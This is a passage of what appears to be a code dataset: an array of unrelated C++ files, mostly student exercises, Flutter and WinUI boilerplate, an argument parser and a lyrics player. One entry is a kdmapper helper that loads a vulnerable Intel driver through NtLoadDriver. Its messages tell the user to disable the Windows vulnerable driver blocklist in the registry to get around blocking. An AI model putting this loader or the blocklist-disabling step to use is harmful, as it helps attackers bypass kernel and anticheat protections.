Data\"<<endl;\n\tcout<<\"2. Show Student Data\"<<endl;\n\tcout<<\"3. Search Student Data\"<<endl;\n \tcout<<\"4. Update Student Data\"<<endl;\n \tcout<<\"5. Delete Student Data\"<<endl;\n \tcout<<\"0. Exit\"<<endl;\n \tcout<<\"Enter choice: \";\n \tcin>>val;\n \t\n \tcout<<endl;\n \t\n \tif(val==1){\n \tinsertS(conn,u);\t\n\t }\n\t \n\telse if(val==2){\n\tshowRecord(conn);\t\n\t}\n\t\n\telse if(val==3){\n\tsearchS(conn);\t\n\t}\n\t\n\telse if(val==4){\n\tupdateS(conn,u);\t\n\t}\n\t\n\telse if(val==5){\n\tdeleteS(conn);\t\n\t}\n\t\n\telse if(val==0){\n\t\texit = true;\n\t\tcout<<\"Good Luck!\"<<endl;\n\t\tSleep(3000);\n\t}\n\telse{\n\t\tcout<<\"Invalid Input\"<<endl;\n\t\tSleep(300);\n\t}\n}\n\n    return 0;\n}\n\n",
    "#include <iostream>\n#include <cmath>\n\nusing namespace std;\n\nint main() {\n\tdouble x, y, A;\n\n\tcout << \"x = \"; cin >> x;\n\n\t//1 \u00f1\u00ef\u00ee\u00f1\u00b3\u00e1\n\n\tif (x < 0 || x == 0) {\n\t\tA = log(cos(x)) + x * x * x * x * x;\n\t\tcout << \"1\" << endl;\t\t\t\t\t\t\t//\u00ef\u00e5\u00f0\u00e5\u00e2\u00fb\u00f0\u00ea\u00e0 \u00ef\u00e5\u00f0\u00f8\u00ee\u00e3\u00ee \u00f1\u00ef\u00ee\u00f1\u00ee\u00e1\u00f3\n\t}\n\tif (x > 0 && x < 3) {\n\t\tA = cos(1 + log(x)) / sin(1 + log(x));\n\t\tcout << \"2\" << endl;\n\t}\n\tif (x == 3) {\n\t\tA = cos(1 + log(x)) / sin(1 + log(x));\n\t\tcout << \"2\" << endl;\n\t}\n\n\tif (x > 3) {\n\t\tA = 12 * x - x * x * x * x * x * x * x * x;\n\t\tcout << \"3\" << endl;\n\t\t\n\t}\n\ty = 2 + 6 * x + A;\n\n\tcout << \"1) y = \" << y << endl;\n\n\t//2 \u00f1\u00ef\u00ee\u00f1\u00b3\u00e1\n\n\tif (x < 0 || x == 0) {\n\t\tA = log(cos(x)) + x * x * x * x * x;\n\t\tcout << \"11\" << endl;\t\t\t\t\t\t\t//\u00ef\u00e5\u00f0\u00e5\u00e2\u00b3\u00f0\u00ea\u00e0 \u00e4\u00f0\u00f3\u00e3\u00ee\u00e3\u00ee \u00f1\u00ef\u00ee\u00f1\u00ee\u00e1\u00f3\n\t}\n\telse\n\t\tif (x > 0 && x < 3) {\n\t\t\tA = cos(1 + log(x)) / sin(1 + log(x));\n\t\t\tcout << \"22\" << endl;\n\t\t}\n\t\telse \n\t\t\tif (x == 3) {\n\t\t\t\tA = cos(1 + log(x)) / sin(1 + log(x));\n\t\t\t\tcout << \"22\" << endl;\n\t\t\t}\n\t\t\telse\n\t\t\t\tif (x > 3) {\n\t\t\t\t\tA = 12 * x - x * x * x * x * x * x * x * x;\n\t\t\t\t\tcout << \"33\" << endl;\n\t\t\t}\n\ty = 2 + 6 * x + A;\n\n\tcout << \"2) y = \" << y << endl;\n\n\treturn 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_news_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/* SPDX-License-Identifier: BSD-3-Clause */\n/* Copyright (c) 2024 Bjoern Boss Henrichsen */\n#include \"arger.h\"\n\ntemplate <class Type>\nstatic std::wstring ParseProgramName(const Type* str, bool defOnError) {\n\tstd::basic_string_view<Type> view{ str };\n\n\tsize_t begin = view.size();\n\twhile (begin > 0 && view[begin - 1] != L'/' && view[begin - 1] != L'\\\\')\n\t\t--begin;\n\n\tif (begin == view.size())\n\t\treturn (defOnError ? L\"%unknown%\" : L\"\");\n\treturn str::View{ view.substr(begin) }.to<std::wstring>();\n}\n\n\nbool arger::Parsed::flag(const std::wstring& name) const {\n\treturn (pFlags.count(name) > 0);\n}\nconst std::wstring& arger::Parsed::group() const {\n\treturn pGroup;\n}\nsize_t arger::Parsed::options(const std::wstring& name) const {\n\tauto it = pOptions.find(name);\n\treturn (it == pOptions.end() ? 0 : it->second.size());\n}\nstd::optional<arger::Value> arger::Parsed::option(const std::wstring& name, size_t index) const {\n\tauto it = pOptions.find(name);\n\tif (it == pOptions.end() || index >= it->second.size())\n\t\treturn {};\n\treturn it->second[index];\n}\nsize_t arger::Parsed::positionals() const {\n\treturn pPositional.size();\n}\nstd::optional<arger::Value> arger::Parsed::positional(size_t index) const {\n\tif (index >= pPositional.size())\n\t\treturn {};\n\treturn pPositional[index];\n}\n\n\narger::Arguments::Arguments(std::wstring version, std::wstring groupName) {\n\tpVersion = version;\n\tpGroupName = str::View{ groupName }.lower();\n}\n\nvoid arger::Arguments::fAddHelpNewLine(bool emptyLine, HelpState& s) const {\n\tif (s.buffer.empty() || s.buffer.back() != L'\\n')\n\t\ts.buffer.push_back(L'\\n');\n\tif (emptyLine)\n\t\ts.buffer.push_back(L'\\n');\n\ts.pos = 0;\n}\nvoid arger::Arguments::fAddHelpToken(const std::wstring& add, HelpState& s) const {\n\tif (s.pos > 0 && s.pos + add.size() > Arguments::NumCharsHelp) {\n\t\ts.buffer.push_back(L'\\n');\n\t\ts.pos = 0;\n\t}\n\n\ts.buffer.append(add);\n\ts.pos += add.size();\n}\nvoid arger::Arguments::fAddHelpSpacedToken(const std::wstring& add, HelpState& s) const {\n\tif (s.pos > 0) {\n\t\tif (s.pos + 1 + add.size() > Arguments::NumCharsHelp) {\n\t\t\ts.buffer.push_back(L'\\n');\n\t\t\ts.pos = 0;\n\t\t}\n\t\telse {\n\t\t\ts.buffer.push_back(L' ');\n\t\t\t++s.pos;\n\t\t}\n\t}\n\tfAddHelpToken(add, s);\n}\nvoid arger::Arguments::fAddHelpString(const std::wstring& add, HelpState& s, size_t offset, size_t indentAutoBreaks) const {\n\tstd::wstring tokenWhite, tokenPrint;\n\tbool isWhitespace = true;\n\n\t/* ensure the initial indentation is valid */\n\tif (offset > 0) {\n\t\tif (s.pos >= offset) {\n\t\t\ts.buffer.push_back(L'\\n');\n\t\t\ts.pos = 0;\n\t\t}\n\t\ts.buffer.append(offset - s.pos, L' ');\n\t\ts.pos = offset;\n\t\toffset += indentAutoBreaks;\n\t}\n\n\t/* iterate over the string and collect all ranges of whitespace, followed by printable characters, and\n\t*\tflush them out to the output whenever the line overflows or a newline/new printable-token is encountered */\n\tfor (size_t i = 0; i <= add.size(); ++i) {\n\t\tif (i < add.size() && !std::iswspace(add[i])) {\n\t\t\tisWhitespace = false;\n\t\t\ttokenPrint.push_back(add[i]);\n\t\t\tcontinue;\n\t\t}\n\n\t\t/* check if the last whitespace and printable token need to be flushed (only if printable buffer is\n\t\t*\tnot empty and the next character is either the end of the string or a new whitespace character) */\n\t\tif (!isWhitespace) {\n\t\t\t/* check if the whitespace token should be replaced with a line-break, if the printable character\n\t\t\t*\tdoes not start at the beginning of the line but exceeds the line limit, and otherwise flush\n\t\t\t*\tthe whitespace (this ensures that user-placed whitespace after a new-line will be respected) */\n\t\t\tif ((s.pos > offset || tokenWhite.size() > 0) && s.pos + tokenWhite.size() + tokenPrint.size() > Arguments::NumCharsHelp)\n\t\t\t\ts.buffer.append(1, L'\\n').append(s.pos = offset, L' ');\n\t\t\telse {\n\t\t\t\ts.buffer.append(tokenWhite);\n\t\t\t\ts.pos += tokenWhite.size();\n\t\t\t}\n\n\t\t\t/* flush the last printable token to the buffer */\n\t\t\ts.buffer.append(tokenPrint);\n\t\t\ts.pos += tokenPrint.size();\n\t\t\ttokenWhite.clear();\n\t\t\ttokenPrint.clear();\n\t\t}\n\t\tif (i >= add.size())\n\t\t\tbreak;\n\n\t\t/* check if the new token is a linebreak and insert it and otherwise add the whitespace to the current token */\n\t\tisWhitespace = true;\n\t\tif (add[i] == L'\\n')\n\t\t\ts.buffer.append(1, L'\\n').append(s.pos = offset, L' ');\n\t\telse\n\t\t\ttokenWhite.push_back(add[i]);\n\t}\n}\n\nvoid arger::Arguments::fBuildHelpUsage(const GroupEntry* current, const std::wstring& program, HelpState& s) const {\n\t/* add the example-usage descriptive line */\n\tfAddHelpNewLine(true, s);\n\tfAddHelpToken(L\"Usage: \", s);\n\tfAddHelpToken(program, s);\n\n\t/* add the general group token, or explicit group selected */\n\tif (!pNullGroup)\n\t\tfAddHelpSpacedToken((current == 0 ? pGroupName : current->name), s);\n\n\t/* add all required options (must all consume a payload, as flags are never required) */\n\tbool hasOptionals = false;\n\tfor (const auto& opt : pOptional) {\n\t\t/* check if the entry can be skipped for this group */\n\t\tif (!opt.second.users.empty() && current != 0 && opt.second.users.count(current->name) == 0)\n\t\t\tcontinue;\n\t\tif (opt.second.minimum == 0) ",
    "#include \"include/service.hpp\"\r\n\r\nbool service::RegisterAndStart(const std::wstring& driver_path) {\r\n\tconst static DWORD ServiceTypeKernel = 1;\r\n\tconst std::wstring driver_name = intel_driver::GetDriverNameW();\r\n\tconst std::wstring servicesPath = L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\\" + driver_name;\r\n\tconst std::wstring nPath = L\"\\\\??\\\\\" + driver_path;\r\n\r\n\tHKEY dservice;\r\n\tLSTATUS status = RegCreateKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &dservice); //Returns Ok if already exists\r\n\tif (status != ERROR_SUCCESS) {\r\n\t\tLog(\"[-] Can't create service key\" << std::endl);\r\n\t\treturn false;\r\n\t}\r\n\r\n\tstatus = RegSetKeyValueW(dservice, NULL, L\"ImagePath\", REG_EXPAND_SZ, nPath.c_str(), (DWORD)(nPath.size()*sizeof(wchar_t)));\r\n\tif (status != ERROR_SUCCESS) {\r\n\t\tRegCloseKey(dservice);\r\n\t\tLog(\"[-] Can't create 'ImagePath' registry value\" << std::endl);\r\n\t\treturn false;\r\n\t}\r\n\t\r\n\tstatus = RegSetKeyValueW(dservice, NULL, L\"Type\", REG_DWORD, &ServiceTypeKernel, sizeof(DWORD));\r\n\tif (status != ERROR_SUCCESS) {\r\n\t\tRegCloseKey(dservice);\r\n\t\tLog(\"[-] Can't create 'Type' registry value\" << std::endl);\r\n\t\treturn false;\r\n\t}\r\n\t\r\n\tRegCloseKey(dservice);\r\n\r\n\tHMODULE ntdll = GetModuleHandleA(\"ntdll.dll\");\r\n\tif (ntdll == NULL) {\r\n\t\treturn false;\r\n\t}\r\n\r\n\tauto RtlAdjustPrivilege = (nt::RtlAdjustPrivilege)GetProcAddress(ntdll, \"RtlAdjustPrivilege\");\r\n\tauto NtLoadDriver = (nt::NtLoadDriver)GetProcAddress(ntdll, \"NtLoadDriver\");\r\n\r\n\tULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;\r\n\tBOOLEAN SeLoadDriverWasEnabled;\r\n\tNTSTATUS Status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled);\r\n\tif (!NT_SUCCESS(Status)) {\r\n\t\tLog(\"Fatal error: failed to acquire SE_LOAD_DRIVER_PRIVILEGE. Make sure you are running as administrator.\" << std::endl);\r\n\t\treturn false;\r\n\t}\r\n\r\n\tstd::wstring wdriver_reg_path = L\"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\\\\\" + driver_name;\r\n\tUNICODE_STRING serviceStr;\r\n\tRtlInitUnicodeString(&serviceStr, wdriver_reg_path.c_str());\r\n\r\n\tStatus = NtLoadDriver(&serviceStr);\r\n\r\n\r\n\tLog(\"[+] NtLoadDriver Status 0x\" << std::hex << Status << std::endl);\r\n\r\n\tif (Status == 0xC0000603) { //STATUS_IMAGE_CERT_REVOKED\r\n\t\tLog(\"[-] Your vulnerable driver list is enabled and have blocked the driver loading, you must disable vulnerable driver list to use kdmapper with intel driver\" << std::endl);\r\n\t\tLog(\"[-] Registry path to disable vulnerable driver list: HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\CI\\\\Config\" << std::endl);\r\n\t\tLog(\"[-] Set 'VulnerableDriverBlocklistEnable' as dword to 0\" << std::endl);\r\n\t}\r\n\telse if (Status == 0xC0000022 || Status == 0xC000009A) { //STATUS_ACCESS_DENIED and STATUS_INSUFFICIENT_RESOURCES\r\n\t\tLog(\"[-] Access Denied or Insufficient Resources (0x\" << std::hex << Status << \"), Probably some anticheat or antivirus running blocking the load of vulnerable driver\" << std::endl);\r\n\t}\r\n\t\r\n\t\r\n\t//Never should occur since kdmapper checks for \"IsRunning\" driver before\r\n\tif (Status == 0xC000010E) {// STATUS_IMAGE_ALREADY_LOADED\r\n\t\treturn true;\r\n\t}\r\n\t\r\n\treturn NT_SUCCESS(Status);\r\n}\r\n\r\nbool service::StopAndRemove(const std::wstring& driver_name) {\r\n\tHMODULE ntdll = GetModuleHandleA(\"ntdll.dll\");\r\n\tif (ntdll == NULL)\r\n\t\treturn false;\r\n\r\n\tstd::wstring wdriver_reg_path = L\"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\\\\\" + driver_name;\r\n\tUNICODE_STRING serviceStr;\r\n\tRtlInitUnicodeString(&serviceStr, wdriver_reg_path.c_str());\r\n\r\n\tHKEY driver_service;\r\n\tstd::wstring servicesPath = L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\\" + driver_name;\r\n\tLSTATUS status = RegOpenKeyW(HKEY_LOCAL_MACHINE, servicesPath.c_str(), &driver_service);\r\n\tif (status != ERROR_SUCCESS) {\r\n\t\tif (status == ERROR_FILE_NOT_FOUND) {\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\treturn false;\r\n\t}\r\n\tRegCloseKey(driver_service);\r\n\r\n\tauto NtUnloadDriver = (nt::NtUnloadDriver)GetProcAddress(ntdll, \"NtUnloadDriver\");\r\n\tNTSTATUS st = NtUnloadDriver(&serviceStr);\r\n\tLog(\"[+] NtUnloadDriver Status 0x\" << std::hex << st << std::endl);\r\n\tif (st != 0x0) {\r\n\t\tLog(\"[-] Driver Unload Failed!!\" << std::endl);\r\n\t\tstatus = RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());\r\n\t\treturn false; //lets consider unload fail as error because can cause problems with anti cheats later\r\n\t}\r\n\t\r\n\r\n\tstatus = RegDeleteTreeW(HKEY_LOCAL_MACHINE, servicesPath.c_str());\r\n\tif (status != ERROR_SUCCESS) {\r\n\t\treturn false;\r\n\t}\r\n\treturn true;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//main.cpp \n\n// Include necessary header files\n#include \"BaseUser.h\"\n#include \"RegisteredUser.h\"\n#include \"AdminUser.h\"\n#include \"University.h\"\n#include \"UserInterface.h\"\n#include \"DataSeeder.h\"\n#include \"SortAndSearch.h\"\n#include \"UserManager.h\"\n\n\n\n#include <iostream>\n#include <string>\n#include <fstream>\n#include <sstream>\n#include <string>\n#include <chrono>\n#include <ctime>\n#include <string> \n\nusing namespace std::chrono;\nusing namespace std;\n\ntm* default_time = new tm;\nstring tm2string(tm* time) {\n    string hour = to_string(time->tm_hour);\n    string min = to_string(time->tm_min);\n    string sec = to_string(time->tm_sec);\n    string year = to_string(time->tm_year + 1900);\n    string month = to_string(time->tm_mon + 1);\n    string day = to_string(time->tm_mday);\n    return day + \"/\" + month + \"/\" + year + \"-\" + hour + \":\" + min + \":\" + sec;\n}\n\nstring tm2string(tm*);\n\nint main()\n{\n    // Load the data from the CSV file\n    DataSeeder::loadData();\n\n    // Check if data is loaded correctly\n    if (DataSeeder::getUniversities().empty()) {\n        std::cerr << \"Error: No university data loaded.\\n\";\n        return -1;\n    }\n\n    UserManager userManager;  // Create a UserManager object\n    UserInterface ui(userManager);\n\n    int choice;\n    while (true)\n    {\n        ui.mainMenu();\n\n        std::cin >> choice;\n        std::cin.ignore();\n\n        switch (choice)\n        {\n        case 1:\n            displayAllUniversities();\n            break;\n        case 2:\n            SortMenu();\n            break;\n        case 3:\n            SearchMenu();\n            break;\n        case 4:\n            ui.createUserAccount();\n            break;\n        case 5:\n            ui.loginUser();\n            break;\n        case 6:\n            ui.loginAdmin();\n            break;\n        case 0:\n            return 0;\n        default:\n            std::cout << \"Invalid option. Please try again.\\n\";\n            break;\n        }\n    }\n\n    return 0;\n}\n\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <thread>\n#include <chrono>\n#include <vector>\n#include <sstream>\n#include <regex>\n#include <dirent.h>  \n#include <iomanip>\n\nstruct LyricLine {\n    std::string text;\n    int timestamp;\n};\n\nint parseTimestamp(const std::string& timestamp) {\n    std::regex regex(\"\\\\[(\\\\d+):(\\\\d+\\\\.\\\\d+)\\\\]\");\n    std::smatch match;\n    if (std::regex_search(timestamp, match, regex) && match.size() > 2) {\n        try {\n            int minutes = std::stoi(match[1]);\n            double seconds = std::stod(match[2]);\n            return minutes * 60 + static_cast<int>(seconds);\n        } catch (const std::exception&) {\n            return -1; \n        }\n    }\n    return -1;\n}\n\nstd::vector<LyricLine> loadLyrics(const std::string& filename) {\n    std::vector<LyricLine> lyrics;\n    std::ifstream file(filename);\n    \n    if (!file.is_open()) {\n        std::cerr << \"Error: Could not open file \" << filename << std::endl;\n        return lyrics;\n    }\n    \n    std::string line;\n    std::regex timestampRegex(\"\\\\[(\\\\d+):(\\\\d+\\\\.\\\\d+)\\\\]\");\n    \n    while (std::getline(file, line)) {\n        std::smatch match;\n        if (std::regex_search(line, match, timestampRegex) && match.size() > 2) {\n            std::string timestamp = match.str(0);\n            std::string text = line.substr(match.position() + match.length());\n            \n            int timeInSeconds = parseTimestamp(timestamp);\n            if (timeInSeconds != -1) {\n                lyrics.push_back({text, timeInSeconds});\n            } else {\n                std::cerr << \"Warning: Invalid timestamp format in line: \" << line << std::endl;\n            }\n        }\n    }\n    return lyrics;\n}\n\nvoid banner() {\n    #ifdef _WIN32\n    system(\"cls\");\n    #else\n    system(\"clear\");\n    #endif\n    std::cout << \" _______________________________________\" << std::endl;\n    std::cout << \"|                                       | \" << std::endl;\n    std::cout << \"|          LOT - BY ARWIN               | \" << std::endl;\n    std::cout << \"|_______________________________________| \" << std::endl;\n}\n\nstd::vector<std::string> listFilesInDirectory(const std::string& directoryPath, const std::string& extension) {\n    std::vector<std::string> files;\n    DIR* dir = opendir(directoryPath.c_str());\n    if (dir == nullptr) {\n        std::cerr << \"Error: Could not open directory \" << directoryPath << std::endl;\n        return files;\n    }\n    \n    struct dirent* entry;\n    while ((entry = readdir(dir)) != nullptr) {\n        std::string filename = entry->d_name;\n        if (filename.find(extension) != std::string::npos) {\n            files.push_back(filename.substr(0, filename.size() - extension.size()));\n        }\n    }\n    closedir(dir);\n    return files;\n}\n\nvoid displaySongsInColumns(const std::vector<std::string>& songFiles, int columns) {\n    if (columns <= 0) columns = 1;\n\n    size_t numSongs = songFiles.size();\n    size_t numRows = (numSongs + columns - 1) / columns;\n\n    size_t maxWidth = 0;\n    for (const auto& song : songFiles) {\n        maxWidth = std::max(maxWidth, song.length());\n    }\n\n    for (size_t row = 0; row < numRows; ++row) {\n        for (int col = 0; col < columns; ++col) {\n            size_t index = row + col * numRows;\n            if (index < numSongs) {\n                std::cout << std::right << std::setw(3) << index + 1 << \". \"\n                          << std::left << std::setw(maxWidth + 2) << songFiles[index];\n            }\n        }\n        std::cout << std::endl;\n    }\n}\n\nvoid playAudio(const std::string& musicFile) {\n    std::string command = \"ffplay \\\"\" + musicFile + \"\\\" -nodisp -autoexit -loglevel quiet\";\n    system(command.c_str());\n}\n\nvoid typeInText(const std::string& text, int delayMs) {\n    for (char c : text) {\n        std::cout << c << std::flush;\n        std::this_thread::sleep_for(std::chrono::milliseconds(delayMs));\n    }\n    std::cout << std::endl;\n}\n\nint main() {\n    banner();\n\n    std::string songsDir = \"songs\";\n    std::string lyricsDir = \"lyrics\";\n    std::string extension = \".mp3\";\n\n    auto songFiles = listFilesInDirectory(songsDir, extension);\n    \n    if (songFiles.empty()) {\n        std::cerr << \"No songs found in the directory.\" << std::endl;\n        return 1;\n    }\n\n    std::cout << \"Available songs:\" << std::endl;\n    displaySongsInColumns(songFiles, 3);\n\n    size_t choice;\n    std::cout << \"Enter the number of the song you want to play: \";\n    if (!(std::cin >> choice) || choice < 1 || choice > songFiles.size()) {\n        std::cerr << \"Invalid choice.\" << std::endl;\n        return 1;\n    }\n\n    std::string selectedSong = songFiles[choice - 1];\n    std::string musicFile = songsDir + \"/\" + selectedSong + extension;\n    std::string lyricsFile = lyricsDir + \"/\" + selectedSong + \".lrc\";\n\n    auto lyrics = loadLyrics(lyricsFile);\n    if (lyrics.empty()) {\n        std::cerr << \"No lyrics found for the selected song.\" << std::endl;\n        return 1;\n    }\n\n    std::thread audioThread(playAudio, musi",
    "#include \"search.h\"\nusing namespace std;\n\n//checks if the string is being cleaned properly\nbool testCleanToken() {\n  string ans = \"hello\";\n  int pass = 0, fail = 0;\n\n  ans == cleanToken(\".hello\") ? ++pass : ++fail;\n  ans == cleanToken(\"...hello\") ? ++pass : ++fail;\n  ans == cleanToken(\"...hello...\") ? ++pass : ++fail;\n  ans == cleanToken(\"...hello123   \") ? ++pass : ++fail;\n  ans == cleanToken(\"123\") ? ++pass : ++fail;\n  \n\n  return 0 == fail;\n}\n\n//test gather token function which seperates each word in the sentence into it's own token\nbool testGatherToken(){\n    int pass = 0, fail = 0;\n    set<string> answer1;\n    answer1.insert(\"hey\");\n    answer1.insert(\"there\");\n    answer1.insert(\"insert\");\n    answer1.insert(\"this\");\n    answer1.insert(\"token\");\n\n    answer1 == gatherTokens(\"hey hey there there THere INSERT this this ThiS Token\") ? ++pass : ++fail;\n    answer1 == gatherTokens(\"hey there insert this! token!!!!\") ? ++pass : ++fail;\n    answer1 == gatherTokens(\"hey!!! hey!!! there...  this   token   \") ? ++pass : ++ fail;\n\n    return 0 == fail;\n}\n\nvoid testBuildIndex(){\n    string filename = \"tiny.txt\";  // Change to the path of your sample text file\n    map<string, set<string> > index;\n\n    // Call the buildIndex function to build the index\n    int numDocuments = buildIndex(filename, index);\n    int count = 0;\n    //check if the correct num of documents were added\n    if (numDocuments == 4) {\n        cout << \"buildIndex built successfully!\" << endl;\n        cout << \"Number of documents processed: \" << numDocuments << endl;\n    \n        // Print the index \n        cout << \"Index contents:\" << endl;\n        for (auto& entry : index) {\n            count++;\n        }\n    \n        if(count == 20){\n            cout << \"Success every word was added with its matching url\" << endl;\n        }else{\n            cout << \"Failed, every word was not added\" << endl;\n        }\n    }else{\n        cout << \"Failed, the txt file did not open\" << endl;\n    }\n}\n\n\n\n//tests various differenct combinations of words to see if it matches the expected answer\nbool testFindQueryMatches(){\n    int pass = 0, fail = 0;\n    map<string, set<string> > test;\n\n    \n    buildIndex(\"tiny.txt\", test);\n    set<string> test1, test2, test3, test4, test5;\n\n    //test just a regular word\n    test1.insert(\"www.shoppinglist.com\");\n    test1.insert(\"www.dr.seuss.net\");\n    test1.insert(\"www.rainbow.org\");\n    test1 == findQueryMatches(test, \"green fish\") ? ++pass : ++fail;\n\n    //test set intesection\n    test2.insert(\"www.dr.seuss.net\");\n    test2 == findQueryMatches(test, \"blue +fish\") ? ++pass : ++fail;\n\n    //test set differences\n    test3.insert(\"www.ranbow.org\");\n    test3 == findQueryMatches(test, \"green -fish\") ? ++pass : ++fail;\n\n    //tests for multiple wordsv\n    test4.insert(\"www.bigbadwolf.com\");\n    test4.insert(\"www.dr.seuss.net\");\n    test4.insert(\"www.rainbow.org\");\n    test4.insert(\"www.shoppinglist.com\");\n    test4 == findQueryMatches(test, \"green blue fish eat\") ? ++pass : ++fail;\n\n    //test multiple words with +/-\n    test5.insert(\"www.ranbow.org\");\n    test5.insert(\"www.bigbadwolf.com\");\n    test5 == findQueryMatches(test, \"green +blue -fish eat\") ? ++pass : ++fail;\n    return 0 == fail;\n}\n\nint main() {\n\n//    //test clean token function\n//     if(testCleanToken){\n//         cout << \"cleanTokens produces the CORRECT output\" << endl;\n//     }else{\n//         cout << \"cleanTokens produces the INCORRECT output\" << endl;\n//     }\n\n//     //test gather token function\n//     if(testGatherToken){\n//         cout << \"gatherTokens produces the CORRECT output\" << endl;\n//     }else{\n//         cout << \"gatherTokens produces the INCORRECT output\" << endl;\n//     }\n//     // test find query funcion\n//     if(testFindQueryMatches){\n//         cout << \"findQueryMatches produces the CORRECT output\" << endl;\n//     }else{\n//         cout << \"findQueryMatches produces the INCORRECT output\" << endl;\n//    }\n//    //checks if the txt file was\n//     testBuildIndex();\n\n//     cout << endl;\n\n    //run search engine\n        string filename;\n        getline(cin, filename);\n        searchEngine(filename);\n\n\n    return 0;\n}",
    "/*\n _____    _ _             _   _ ___ _____         _ _   _ _\n|_   _| _(_) |_ ___ _ _  | | | |_ _|_   _|__  ___| | |_(_) |_\n  | || '_| |  _/ _ \\ ' \\ | |_| || | _| |/ _ \\/ _ \\ | / / |  _|\n  |_||_| |_|\\__\\___/_||_(_)___/|___(_)_|\\___/\\___/_|_\\_\\_|\\__|\n\nCopyright \u00a9 2024, Michel Gerritse\nAll rights reserved.\n\nThis source code is available under the BSD-3-Clause license.\nSee LICENSE.txt in the root directory of this source tree.\n\n*/\n#include \"pch.h\"\n#include \"FontIconExtension.h\"\n#include \"Extensions/FontIconExtension.g.cpp\"\n\n/* References:\n\thttps://learn.microsoft.com/en-us/windows/windows-app-sdk/api/winrt/microsoft.ui.xaml.markup.markupextension\n\thttps://learn.microsoft.com/en-us/windows/windows-app-sdk/api/winrt/microsoft.ui.xaml.controls.fonticon\n\thttps://learn.microsoft.com/en-us/windows/windows-app-sdk/api/winrt/microsoft.ui.xaml.controls.iconelement\n*/\n\nnamespace winrt::Triton::UI::Extensions::implementation\n{\n/* MarkupExtension overrides */\n#pragma region MarkupExtension overrides\n\n\tIInspectable FontIconExtension::ProvideValue()\n\t{\n\t\tFontIcon Icon;\n\n\t\tif (m_FontFamily) Icon.FontFamily(m_FontFamily);\n\t\tIcon.FontSize(m_FontSize);\n\t\tIcon.FontStyle(m_FontStyle);\n\t\tIcon.FontWeight(m_FontWeight);\n\t\tIcon.Glyph(m_Glyph);\n\t\tIcon.IsTextScaleFactorEnabled(m_IsTextScaleFactorEnabled);\n\t\tIcon.MirroredWhenRightToLeft(m_MirroredWhenRightToLeft);\n\t\tif (m_Foreground) Icon.Foreground(m_Foreground);\n\t\t\n\t\treturn Icon;\n\t}\n\n\tIInspectable FontIconExtension::ProvideValue(IXamlServiceProvider const&)\n\t{\n\t\treturn ProvideValue();\n\t}\n\n#pragma endregion\n\t\n/* FontIcon properties */\n#pragma region FontIcon properties\n\n\tmuxm::FontFamily FontIconExtension::FontFamily()\n\t{\n\t\treturn m_FontFamily;\n\t}\n\n\tvoid FontIconExtension::FontFamily(muxm::FontFamily Value)\n\t{\n\t\tm_FontFamily = Value;\n\t}\n\n\tdouble FontIconExtension::FontSize()\n\t{\n\t\treturn m_FontSize;\n\t}\n\n\tvoid FontIconExtension::FontSize(double Value)\n\t{\n\t\tm_FontSize = Value;\n\t}\n\n\twut::FontStyle FontIconExtension::FontStyle()\n\t{\n\t\treturn m_FontStyle;\n\t}\n\n\tvoid FontIconExtension::FontStyle(wut::FontStyle Value)\n\t{\n\t\tm_FontStyle = Value;\n\t}\n\n\twut::FontWeight 